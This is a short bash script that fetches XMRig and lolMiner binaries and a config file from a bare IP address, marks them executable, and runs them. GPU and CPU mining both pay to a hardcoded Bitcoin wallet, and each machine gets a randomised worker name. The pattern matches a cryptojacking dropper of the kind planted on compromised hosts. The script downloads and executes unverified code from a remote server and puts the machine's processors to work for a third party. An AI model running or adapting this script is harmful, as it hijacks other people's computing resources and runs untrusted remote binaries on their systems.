#!/bin/bash

# Define download function
download(){
curl -O $1 || wget $1 || {
echo "Both curl and wget failed to download $1" >&2
exit 1
}
}

# Generate a random username
RANDOM_USER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
# URLs for miners and config
url_xmrig="http://162.248.247.133/1/xmrig-6.20.0-linux-x64/xmrig-6.20.0/xmrig"
url_config="http://162.248.247.133/1/config.json"
url_miner="http://162.248.247.133/2/lolMiner_v1.76_Lin64/1.76/lolMiner"

# Check if GPU is available
if command -v nvidia-smi &> /dev/null
then
    GPU_CORES_COUNT=$(nvidia-smi --query-gpu=gpu_name --format=csv,noheader | wc -l)
    if [ "$GPU_CORES_COUNT" -gt 0 ]
    then
        download $url_miner
        chmod +x lolMiner
        ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.GPU-$GPU_CORES_COUNT-$RANDOM_USER --tls 0
    fi
else
    echo "GPU not found, continuing with CPU cores only."
fi

# CPU miner
download $url_xmrig
download $url_config
chmod +x xmrig
# Generate a random username
RANDOM_USER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
CPU_CORES=$(nproc --all)
sed -i 's|"user": "BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993"|"user": "BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.CPU-'$CPU_CORES'-'$RANDOM_USER'"|g' config.json
./xmrig -c config.json --randomx-mode=fast